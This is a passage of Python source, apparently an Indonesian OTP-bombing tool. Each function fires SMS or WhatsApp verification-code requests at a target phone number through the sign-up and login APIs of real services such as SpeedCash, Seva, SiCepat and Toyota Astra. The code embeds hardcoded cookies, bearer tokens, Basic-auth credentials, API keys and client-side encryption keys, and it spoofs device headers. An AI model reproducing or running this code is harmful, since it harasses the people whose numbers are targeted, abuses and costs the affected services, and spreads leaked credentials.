  -H 'channel-app-version: 2.27.32' \\
  -H 'origin: https://tiptip.id' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://tiptip.id/sign-up' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"action":"SIGN_UP","delivery_method":"WA","phone_number":"{nomor_lokal}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('code') == 'SUCCESS':
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_dokterin(nomor):
     try:
        if nomor.startswith('62'):
            nomor_format = nomor
        elif nomor.startswith('0'):
            nomor_format = '62' + nomor[1:]
        else:
            nomor_format = '62' + nomor

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Origin': 'https://partner.dokterin.co.id',
            'Referer': 'https://partner.dokterin.co.id/',
            'x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJXZWIgQnJvd3NlciIsImRlc2NyaXB0aW9uIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0Ny4wLjAuMCBTYWZhcmkvNTM3LjM2IiwidGltZXpvbmUiOiJBc2lhL0pha2FydGEifQ==',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Connection': 'keep-alive'
        }

        payload = {
            'phone': nomor_format,
            'tnc_accept': True,
            'device': 'Blink',
            'platform': 'web',
            'host': 'https://partner.dokterin.co.id'
        }

        resp = requests.post(
            'https://api.dokterin.id/user/v1/users/login',
            json=payload,
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_speedcash(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        import subprocess
        import json

        cookie_string = 'page=eyJpdiI6IlZpNTBMa05CaTJ5MjdlMFJOQTZuc0E9PSIsInZhbHVlIjoieGZiU0l1Z0lpcFI4WG9XbmlxOTRqdz09IiwibWFjIjoiMWVkZTIzNjdiYzI4MzkwYjcwMWUxOWUzNmNjOTllZmEwN2RlMDg5OTRjZWVlYzM5YjE5ZGUzZTBhMjBhMDY2NyJ9; _gcl_au=1.1.179635825.1783143670; _tt_enable_cookie=1; _ttp=01KWNTA9MFMPRKVN4403SGAP5F_.tt.2; ttcsid_BQG0RGGAC2KB0QR0PJOG=1783143671475::ZLlEKb52-DZYiqWjJ88b.1.1783143675625.0; ttcsid=1783143671481::o8HHyHxWOtSV_vWa1vCw.1.1783143675625.0::1.-4236.0::4170.4.255.361::0.0.0; XSRF-TOKEN=eyJpdiI6Iklyblg2RStMZzBFdTVQQzhzcmZpaEE9PSIsInZhbHVlIjoidmNhYkJHR3pyWTZpQ0tJMm90dTRXc2tkbUI1eWxjeFBKWEJ5TG9iaXhMK045QU1MR0JvYks5K2VaZnluclplRCIsIm1hYyI6ImJiNTlmMjEzYWExNWEwZjQzYjkzN2Q5MjllZDJkNmQ2NWMxNzk4MTY5MjRhYWYzYTY5YTIwMmZhZGMyMDhiNDcifQ%3D%3D; speedcash_session=eyJpdiI6ImJSVG5LSmd6XC9LTHNNYkszUmlBMUx3PT0iLCJ2YWx1ZSI6InpVRnl6WXB6V0FyRjM0RUxYajRcL2ZaMFlOMmNSSDVWNlRmYjQrWlg3VVpLbU01TngrNU5tMXJ4TnkwcTRzdmNrIiwibWFjIjoiZTY2NDc4OTNhYWIxZDc2NTE5NmI1YTg5NjI4N2Y3MDI1Y2FkZjdlYWM0NTZjMjA4MGM1YmIwYzFlMGZmNWE0NyJ9; x-csrf-token=6411dfb2d7c1403d4691c542a1c68512dafd6de7a48220cd54aab8939a6b56e7cc9312b0fa328e5d4c0215b86f8c41fe6258dc59183fc204079a7ae4f91fbee9%7C8fb4ac768bd6142694240b43d8426637f61dfa32690ad4a48c0d0546ea804f81'

        xsrf_token = 'eyJpdiI6Iklyblg2RStMZzBFdTVQQzhzcmZpaEE9PSIsInZhbHVlIjoidmNhYkJHR3pyWTZpQ0tJMm90dTRXc2tkbUI1eWxjeFBKWEJ5TG9iaXhMK045QU1MR0JvYks5K2VaZnluclplRCIsIm1hYyI6ImJiNTlmMjEzYWExNWEwZjQzYjkzN2Q5MjllZDJkNmQ2NWMxNzk4MTY5MjRhYWYzYTY5YTIwMmZhZGMyMDhiNDcifQ=='

        authorization = 'Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2'

        payload = json.dumps({
            "version_name": "3.2.0",
            "version_code": "270",
            "uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "user_uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "via": "BB MOBILE WEB",
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH",
            "location": "0,0",
            "phone": phone,
            "state": "REGISTER",
            "type": "WA"
        })

        curl_otp = f'''curl -s -X POST 'https://member.speedcash.co.id/api/twice/otp/generate' \\
  -H 'authorization: {authorization}' \\
  -H 'content-type: application/json' \\
  -H 'cookie: {cookie_string}' \\
  -H 'origin: https://member.speedcash.co.id' \\
  -H 'referer: https://member.speedcash.co.id/' \\
  -H 'sec-ch-ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: same-origin' \\
  -H "time-request: $(date +%s%3N)" \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36' \\
  -H 'x-csrf-token: 6411dfb2d7c1403d4691c542a1c68512dafd6de7a48220cd54aab8939a6b56e7cc9312b0fa328e5d4c0215b86f8c41fe6258dc59183fc204079a7ae4f91fbee9' \\
  -H 'x-xsrf-token: {xsrf_token}' \\
  -d '{payload}' '''

        result = subprocess.run(['bash', '-c', curl_otp], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                return data.get('rc') == '00'
            except:
                return False
        return False

    except Exception as e:
        return False


def spam_otp_uangme(nomor):
    try:
        aid = f'gaid_15497a9b-2669-42cf-ad10-{spam_otp_codex(12)}'
        url = f'https://api.uangme.com/api/v2/sms_code?phone={nomor}&scene_type=login&send_type=wp'
        headers = {'aid': aid, 'android_id': 'b787045b140c631f', 'app_version': '300504', 'brand': 'samsung', 'carrier': '00', 'Content-Type': 'application/x-www-form-urlencoded', 'country': '510', 'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0', 'fcm_reg_id': 'frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo', 'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0', 'lan': 'in_ID', 'model': 'SM-G965N', 'ns': 'wifi', 'os': '1', 'timestamp': '1732178536', 'tz': 'Asia%2FBangkok', 'User-Agent': 'okhttp/3.12.1', **{'v': '1', 'version': '28'}}
        res = requests.get(url, headers=headers, timeout=10)
    except:
        return False

def spam_otp_seva(nomor):
    try:
        import json
        import time
        import hashlib
        import base64
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        from Crypto.Random import get_random_bytes

        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+'):
            nomor = '+62' + nomor

        def cryptojs_encrypt(data, key):
            salt = get_random_bytes(8)
            key_bytes = key.encode()

            def derive_key_iv(password, salt):
                d = b''
                d_i = b''
                while len(d) < 48:
                    d_i = hashlib.md5(d_i + password + salt).digest()
                    d += d_i
                return (d[:32], d[32:48])

            key_derived, iv = derive_key_iv(key_bytes, salt)
            cipher = AES.new(key_derived, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
            return base64.b64encode(b'Salted__' + salt + encrypted).decode()

        SECRET = 'c2ea90e6b78d9e29f3b9824e5b6bf2e84931f876f1660bf3b4c87c5a938d86d5'
        TS = str(int(time.time() * 1000))
        payload = {'phoneNumber': nomor}
        body = cryptojs_encrypt(json.dumps(payload), SECRET)
        sig_data = TS + ';' + json.dumps(payload)
        signature = cryptojs_encrypt(json.dumps(sig_data), SECRET)

        session = requests.Session()

        headers = {
            'accept': 'application/json',
            'content-type': 'text/plain',
            'x-signature': signature,
            'origin': 'https://www.seva.id',
            'referer': 'https://www.seva.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        resp = session.post('https://api.seva.id/auth/otp/whatsapp', 
                           data=body, 
                           headers=headers, 
                           timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('success'):
                    return True
                return False
            except:
                return True if resp.status_code == 200 else False
        else:
            return False

    except Exception as e:
        return False

def spam_otp_uatas(nomor):
    try:
        import json
        import time
        import base64

        from Crypto.Cipher import AES

        from Crypto.Util.Padding import pad

        if nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        nomor = ''.join(filter(str.isdigit, nomor))
        if not nomor.startswith('0'):
            nomor = '0' + nomor

        def aes_encrypt(data, key, iv):
            key_bytes = key.encode('utf-8')
            cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
            return base64.b64encode(encrypted).decode()
        KEY = '5JkPzCacn1Qj9cAl'
        IV = bytes(16)
        TS = int(time.time() * 1000)
        params = {'mobile': nomor, 'time_stamp': TS}
        data = aes_encrypt(json.dumps(params), KEY, IV)
        session = requests.Session()
        resp = session.post('https://uatas.id/delapi/web/passport/sendphonecode', headers={'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://uatas.id', 'referer': 'https://uatas.id/h5/gml/', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'uid': '0', 'ticket': '0', 'sec_level': '2', 'package_name': 'uatas', 'm_id': '10', 'data': data, 'version': '1.0.0'}, timeout=10)

        return resp.status_code == 200
    except:
        return False

def spam_otp_topindowa(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        import uuid
        import time

        uuid_device = str(uuid.uuid4())

        url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'

        headers = {
            'Host': 'mobileapps.topindoku.co.id',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?1',
            'uuid': uuid_device,
            'Origin': 'https://mitra.topindoku.co.id',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }

        payload = {
            "phone": phone,
            "via": "WA",
            "hash": "gruenbf12d2",
            "fbc": "",
            "fbp": "fb.2.1784860943418.959857478235602163",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_kasirpintar(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor

        session = requests.Session()
        r1 = session.get('https://kasirpintar.co.id/registerpro', 
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            },
            timeout=10
        )
        csrf = re.search('name="_token" value="([^"]+)"', r1.text)
        if csrf:
            csrf = csrf.group(1)
            email = ''.join(random.choices(string.ascii_lowercase, k=10)) + str(int(time.time())) + '@gmail.com'
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
                'Origin': 'https://kasirpintar.co.id',
                'Referer': 'https://kasirpintar.co.id/registerpro',
                'X-CSRF-TOKEN': csrf,
                'X-Requested-With': 'XMLHttpRequest'
            }
            r2 = session.post('https://kasirpintar.co.id/checkEmail',
                headers=headers,
                data={
                    'email': email,
                    'no_hp': nomor,
                    'country_code': '+62',
                    'g_recaptcha_response': '',
                    '_token': csrf
                },
                timeout=10
            )
            token_otp = re.search('"token":"([^"]+)"', r2.text)
            if token_otp:
                token_otp = token_otp.group(1)
                r3 = session.post('https://kasirpintar.co.id/requestOTPWA',
                    headers=headers,
                    data={
                        'no_hp': nomor,
                        'email': email,
                        'token_wa': csrf,
                        'token': token_otp,
                        '_token': csrf
                    },
                    timeout=10
                )
                return r3.status_code < 400
            else:
                return False
        else:
            return False
    except:
        return False

def spam_otp_bigseller(nomor):
    try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor
        session = requests.Session()
        url = "https://www.bigseller.com/api_v2/api/v3/auth/sendRegPhoneCode.json"
        payload = {
            "phoneAccountNum": nomor_lokal,
            "phoneAccountCode": 62,
            "accessCode": "",
            "picVerificationCode": "",
            "ticketId": "tr03NJtP5mTD41cvhMEPRCghT45ergDNSopNa2N-ZQCdKSKRD-L=0oMy3nCnpFeXiigBvrd0Kcyb5wOmMg=rRJoSie1f3PDzS=HJtvgbYT=S71tux2JkJa4hCjoQH7eyGZvrIMxch=nQ4qY*",
            "randomStr": "@T2d"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.bigseller.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
        }
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False


def spam_otp_toyota(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""TOKEN=$(curl -s -X POST 'https://data-web.tam-icm.com/api/public/vendors/tokenize' -H 'Authorization: Basic ZGlkeDpUb3lvdGEyMDI0' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Origin: https://www.toyota.astra.co.id' -H 'Referer: https://www.toyota.astra.co.id/' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' -d '{{\"data\":[\"{phone}\"]}}' | jq -r '.[0].token') && curl -s -X POST 'https://data-web.tam-icm.com/api/public/vendors/register' -H 'Host: data-web.tam-icm.com' -H 'sec-ch-ua-platform: "Android"' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' -H 'Accept: application/json, text/plain, */*' -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' -H 'Content-Type: application/json' -H 'sec-ch-ua-mobile: ?1' -H 'Origin: https://www.toyota.astra.co.id' -H 'sec-fetch-site: cross-site' -H 'sec-fetch-mode: cors' -H 'sec-fetch-dest: empty' -H 'Referer: https://www.toyota.astra.co.id/' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' -d '{{\"phoneNumber\":\"$TOKEN\"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('message') and ('otp' in str(data.get('message')).lower() or 'success' in str(data.get('message')).lower()):
                    return True
                if data.get('statusCode') and '20000' in str(data.get('statusCode')):
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_ktakilat(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        url = 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode'

        payload = {
            'mobileNo': nomor_lokal,
            'smsType': 1
        }

        headers = {
            'Content-Type': 'application/json; charset=UTF-8',
            'Device-Info': 'eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
        }

        res = requests.post(url, json=payload, headers=headers, timeout=10)
        return res.status_code == 200

    except Exception as e:
        return False

def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        unique_code = str(uuid.uuid4())
        url = 'https://m.bantusaku.id/api/user/send-sms'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://m.bantusaku.id',
            'referer': 'https://m.bantusaku.id/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-auth-token': 'null',
            'x-device-os': 'web',
            'x-merchant': 'BantuSaku',
            'x-token-sign': unique_code,
            'x-version': 'web-3.2.1'
        }

        payload = {
            'phone': nomor_lokal,
            'type': 'register',
            'imageCode': '',
            'merchantNo': 'BantuSaku',
            'uniquCode': unique_code
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_bisatopup(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        dev = spam_otp_codex(16)
        url = f'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={dev}&version_name=6.12.04&version=61204'

        payload = f'phone_number={nomor_lokal}'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        res = requests.post(url, data=payload, headers=headers, timeout=10)
        return res.status_code == 200

    except Exception as e:
        return False

def spam_otp_speedcash_wa(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        url_token = 'https://sofia.bmsecure.id/central-api/oauth/token'
        headers_token = {
            'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        res_tok = requests.post(url_token, data='grant_type=client_credentials', headers=headers_token, timeout=10)
        token = spam_otp_nilai(res_tok.text, 'access_token":"', '","')

        if token:
            uuid = spam_otp_codex(8)
            url_otp = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate'
            payload = {
                'version_name': '6.2.1 (428)',
                'phone': nomor_lokal,
                'appid': 'SPEEDCASH',
                'version_code': 428,
                'location': '0,0',
                'state': 'REGISTER',
                'type': 'WA',
                'app_id': 'SPEEDCASH',
                'uuid': f'00000000-4c22-250d-ffff-ffff{uuid}',
                'via': 'BB ANDROID'
            }
            headers_otp = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            res = requests.post(url_otp, json=payload, headers=headers_otp, timeout=10)
            return res.status_code == 200
        else:
            return False

    except Exception as e:
        return False

def spam_otp_sicepat(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        apikey = '67b98547-6cf7-4f05-9c1b-be597fca892f'
        url = f'https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/{nomor_lokal}?sms=true'

        headers = {
            'Host': 'api.sicepatconsumer.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'x-api-key': apikey,
            'Origin': 'https://dashboard.sicepat.com',
            'Referer': 'https://dashboard.sicepat.com/',
            'sec-ch-ua-platform': 'Android'
        }

        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_iskconmumbai(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor_lokal = nomor[1:]
        elif not nomor.startswith('62'):
            nomor_lokal = '62' + nomor
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = 'https://www.iskconmumbai.com/api/send_otp'

        headers = {
            'Host': 'www.iskconmumbai.com',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Referer': 'https://www.iskconmumbai.com/web/signup',
            'Cookie': 'frontend_lang=en_US; session_id=a06efb92ff6b53383e6136b42413bc5cc1af2fc0'
        }

        payload = {
            'id': 7,
            'jsonrpc': '2.0',
            'method': 'call',
            'params': {
                'signup': True,
                'mobile': nomor_lokal
            }
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_jogjakita(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        session = requests.Session()
        auth_resp = session.post('https://aci-user.bmsecure.id/oauth/token', data={'grant_type': 'client_credentials', 'uuid': '00000000-0000-0000-0000-000000000000', 'id_user': '0', 'id_kota': '0', 'location': '0.0,0.0', 'via': 'jogjakita_user', 'version_code': '501', 'version_name': '6.10.1'}, headers={'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'okhttp/4.10.0'}, timeout=10)
        token = auth_resp.json().get('access_token')
        if token:
            resp = session.post('https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send', json={'phone_user': nomor, 'primary_credential': {'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0, 'location': '0.0,0.0', 'uuid': '', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid': '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501', 'version_name': '6.10.1', 'via': 'jogjakita_user'}, headers={'Content-Type': 'application/json; charset=UTF-8', 'Authorization': f'Bearer {token}'}, timeout=10)
            result = resp.json()
        else:
            return False
    except:
        return False


def spam_otp_yogyaonline(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()
        session.get('https://www.yogyaonline.co.id/register', 
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        url = 'https://www.yogyaonline.co.id/api/v1/send-otp'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.yogyaonline.co.id',
            'referer': 'https://www.yogyaonline.co.id/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': 'Android',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }

        payload = {'phone_number': nomor_lokal}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_bantusaku(nomor):
    try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        unique_code = str(uuid.uuid4())
        url = 'https://m.bantusaku.id/api/user/send-sms'

        headers = {
